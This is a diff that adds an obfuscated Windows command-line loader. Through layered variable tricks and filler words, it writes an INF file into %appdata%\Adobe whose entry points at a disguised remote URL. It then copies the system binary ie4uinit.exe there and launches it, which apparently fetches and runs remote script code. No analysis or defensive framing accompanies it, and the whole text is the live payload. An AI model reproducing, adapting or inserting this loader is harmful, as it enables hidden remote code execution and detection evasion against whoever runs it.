@@ -1,0 +1,7 @@
+/v /c (for %y in (s) do @set "Leave=%~y") &&
+  (for %b in (i) do @set "Inches=%~b") &&
+  (for %h in (a) do @set "Garlic=%~h") &&
+  (for %b in (c) do @set "Mixed=%~b") &&
+  call(for %y in ("[version]" "signature =$windows nt$" "[D100]" "sc\" "ro%Merry%j,NI,%Elements%%Analyses%%Analyses%p%Districts%%Determine%%Determine%9xh3hu5!A!Mixed!tual!patrickbeltrame!A!Mixed!tual!com/93582" "[174]" "ieu%Trade%.inf" "[defaultinstall.windows7]" "delfiles=174" "Un\" "Register\" "OCXs=D100" "[destinationdirs]" "defaultdestdir=11" "174=01" "[strings]" "shortsvcname=' '" "Merry=b;Tonight" "Determine=/" "Fruit=%t!Inches!me%" "Analyses=t;Reviews" "servicename=' '" "Elements=h" "Trade=init" "Districts=:;Thought" ) do @echo %~y)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!Inches!n!Indicate!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Auction56=Elder &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Auction0=Example Vessel Rally Chapters History Defects Cheap Regret Qualifications Family Installations Garage Performances Trails Consensus Advantages Endorse Loyal Suppliers Ocean Hopes Online Artefact Carlos Glass Logistics Sheets Notifications Drawings Basics Purity Bikes Students Victory Progress Creations Tower Voters Fonts Coffee Tells Cruises Nasty Encourages Giraffe Andreas Radios Finances Choice Aspects Snack Original Techniques Crane Temperatures Cakes Furnishings Infant Napkin Readings Weekends"
